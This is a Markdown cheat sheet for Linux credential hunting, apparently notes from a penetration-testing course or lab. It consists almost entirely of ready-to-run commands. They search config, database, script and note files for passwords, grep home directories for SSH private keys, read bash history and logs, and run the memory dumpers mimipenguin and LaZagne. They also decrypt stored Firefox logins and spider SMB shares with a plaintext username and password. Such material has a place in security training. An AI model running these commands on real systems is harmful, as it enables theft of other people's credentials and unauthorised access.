# Credential Hunting in Linux

## [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER)

```sh
my@attack:~$ manspider 10.129.234.173 -u 'jbader' -p 'ILovePower333###' --sharenames 'HR' --dirnames 'Confidential' --content 'user|pass|cred|secret|token' --threads 5 --max-filesize 10M
```

## Files

### Configuration Files

```sh
kira@nix01:~$ for ext in .conf .config .cnf; do echo -e "\nFile extension: $ext"; find / -name "*$ext" -type f 2> /dev/null | grep -v 'lib\|fonts\|share\|core'; done
```

### Configuration Files (Credentials)

```sh
kira@nix01:~$ for f in $(find / -name "*.cnf" -type f 2> /dev/null | grep -v 'doc\|lib'); do echo -e "\nFile: $f"; grep 'user\|password\|pass' "$f" 2> /dev/null | grep -v '#'; done
```

### Databases

```sh
kira@nix01:~$ for ext in .sql .*db .db*; do echo -e "\nDB File extension: $ext"; find / -name "*$ext" -type f 2> /dev/null | grep -v 'doc\|lib\|headers\|share\|man'; done
```

### Notes

```sh
kira@nix01:~$ find /home/* -name "*.txt" -o ! -name "*.*" -type f
```

### Scripts

```sh
kira@nix01:~$ for ext in .py .pyc .pl .go .jar .c .sh; do echo -e "\nFile extension: $ext"; find / -name "*$ext" -type f 2> /dev/null | grep -v 'doc\|lib\|headers\|share'; done
```

### Cron

```sh
kira@nix01:~$ ls -la /etc/cron.*/
```

### SSH Keys

#### Private Keys

```sh
kira@nix01:~$ grep -rnw 'PRIVATE KEY' /home/* 2> /dev/null | grep :1
```

#### Public Keys

```sh
kira@nix01:~$ grep -rnw 'ssh-rsa' /home/* 2> /dev/null | grep :1
```

## History

```sh
kira@nix01:~$ tail /home/*/.bash* -n 5
```

## Logs

```sh
kira@nix01:~$ for f in /var/log/*; do GREP=$(grep 'accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|logs' "$f" 2> /dev/null); if [[ $GREP ]]; then echo -e "\nLog file: $f"; grep 'accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|logs' "$f" 2> /dev/null; fi; done
```

## Memory

### [MimiPenguin](https://github.com/huntergregal/mimipenguin)

```sh
kira@nix01:~$ sudo bash mimipenguin.sh
```

### LaZagne

```sh
kira@nix01:~$ sudo python3 laZagne.py all
```

## Browsers

### Firefox Profiles

```sh
kira@nix01:~$ ls -l ~/.mozilla/firefox | grep default
```

### Firefox Stored Credentials

```sh
kira@nix01:~$ cat ~/.mozilla/firefox/al2gs7ib.default-release/logins.json | jq .
```

### [Firefox Decrypt](https://github.com/unode/firefox_decrypt)

```sh
kira@nix01:~$ python3 firefox_decrypt.py
```
